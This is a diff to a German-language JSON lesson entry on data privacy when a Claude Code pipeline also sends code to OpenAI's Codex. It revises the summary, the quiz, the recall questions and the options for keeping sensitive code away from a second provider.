-   "glance": "Ein Codex-Schwarm schickt deinen Quellcode an OpenAI, nicht an Anthropic. Die Datenregeln von Anthropic decken nur die Claude-Seite der Pipeline ab; für den Codex-Teil gelten die Aufbewahrungs- und Trainingsregeln deines OpenAI-Vertrags. Für sensiblen Code hast du drei Auswege: den Codex-Schritt weglassen, ein lokales Modell einsetzen oder Codex nur Signaturen ohne Geschäftslogik zeigen.",
+   "glance": "Ein Codex-Schwarm schickt deinen Quellcode zusätzlich an OpenAI: Was Claude liest, geht an Anthropic, und was in den Aufträgen für Codex steht, geht an OpenAI. Die Datenregeln von Anthropic decken nur die Claude-Seite der Pipeline ab; für den Codex-Teil gelten die Aufbewahrungs- und Trainingsregeln deines OpenAI-Vertrags. Für sensiblen Code hast du drei Auswege: den Codex-Schritt weglassen, ein lokales Modell einsetzen oder Codex nur Signaturen, also das Gerüst ohne Inhalt, zeigen. Dasselbe gilt für jeden zweiten Anbieter, den du an Claude Code anbindest, nicht nur für Codex.",
    "id": "S4.2",
    "level": "bonus",
-   "minutes": 15,
+   "minutes": 25,
    "offers": [],
    "order": 4020,
-   "outcome": "Ich kann erklären, welcher Anbieter in einer Claude-Codex-Pipeline welchen Code sieht, und für sensiblen Code eine der drei Optionen (Codex weglassen, lokales Modell, nur Signaturen senden) begründet wählen.",
+   "outcome": "Ich kann erklären, welcher Anbieter in einer Claude-Codex-Pipeline welchen Code sieht, die Dateien eines kleinen Projekts in „darf raus“, „darf nicht raus“ und „nur Signatur“ einteilen und für sensiblen Code eine der drei Optionen (Codex weglassen, lokales Modell, nur Signaturen senden) begründet wählen.",
    "quiz": {
-    "correct": "Ob der Firmware-Code an OpenAI gehen darf: Dort gelten OpenAIs Aufbewahrungsregeln, nicht die von Anthropic.",
-    "q": "Ein Softwarehaus für Zutrittskontrolle will einen Codex-Schwarm für seinen OSDP-Firmware-Analyzer einsetzen. Was ist vor dem ersten Einsatz die wichtigste Compliance-Frage?",
+    "correct": "Nur die Signaturen der Funktionen, die `api.py` aufruft: Namen, Parameter, Rückgabetypen, ohne Funktionskörper.",
+    "q": "Ein zweiter Anbieter soll in `api.py` einen neuen Endpunkt bauen. `api.py` ruft Funktionen aus `access_rules.py` auf, die vertrauliche Zugriffslogik enthält. Was gibst du ihm von `access_rules.py`?",
     "wrong": [
-     "Ob `--decompose` die Protokolllogik sauber zerlegt, denn eine schlechte Zerlegung ist das größte Compliance-Risiko.",
-     "Ob `--max-budget-usd` gesetzt ist, weil N parallele Agenten die Kosten vervielfachen und das Budget sprengen.",
-     "Ob ein Enterprise-Abo von Claude vorliegt, weil Claude Code die OpenAI-Modelle über seine eigene API lizenziert."
+     "Die ganze Datei, denn der Vertrag mit Anthropic deckt auch den Code ab, den ein zweiter Anbieter im Auftrag von Claude bekommt.",
+     "Nichts außer der Aufgabenbeschreibung, denn der Anbieter errät die Schnittstelle der Funktionen zuverlässig aus ihren Namen.",
+     "Die ganze Datei mit umbenannten Variablen, denn Umbenennen macht die Zugriffslogik für Außenstehende unkenntlich und damit unbedenklich."
     ]
    },
    "recall": [
     "Welche Regeln gelten für den Code, den der Codex-Teil der Pipeline sieht, und welche nicht?",
-    "Nenne die drei Auswege für sensiblen Code.",
-    "Warum ist die Gesamtdauer eines Schwarms die des langsamsten Agenten und nicht die Summe?"
+    "Nenne die drei Auswege für sensiblen Code und je einen Preis, den du dafür zahlst.",
+    "Der zweite Anbieter soll eine Änderung innerhalb einer vertraulichen Datei umsetzen. Warum hilft „nur Signaturen“ nicht, und was wählst du stattdessen?"
    ],
    "requires": [
     "S4.1"
@@ -3582,7 +3622,7 @@
    "shelf": "agents",
    "skip_check": [
     "Kannst du ohne Nachschlagen sagen, welche Teile deines Codes in einer Claude-Codex-Pipeline an OpenAI gehen und warum die Aufbewahrungsregeln von Anthropic dafür nicht gelten?",
-    "Hast du schon einmal eine Aufgabe mit `--decompose` in parallele Teilaufgaben zerlegen lassen und das Ergebnis im Review auf Integrationsfehler geprüft?"
+    "Kannst du aus dem Kopf drei Arten von Dateien in deinem Projekt nennen, die nie an einen zweiten Anbieter gehen sollten?"
    ],
    "sources": [
     "https://code.claude.com/docs/en/data-usage",
